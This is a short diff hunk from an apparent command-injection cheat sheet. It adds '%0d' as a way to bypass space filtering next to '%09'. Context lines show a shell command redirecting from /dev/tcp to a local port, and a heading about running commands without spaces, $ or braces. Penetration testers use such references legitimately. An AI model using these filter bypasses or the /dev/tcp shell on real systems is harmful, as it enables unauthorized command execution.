@@ -94,6 +94,7 @@ Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 
 %09 bypass space
+%0d bypass space
 ```
 
 Commands execution without spaces, $ or { } - Linux (Bash only)
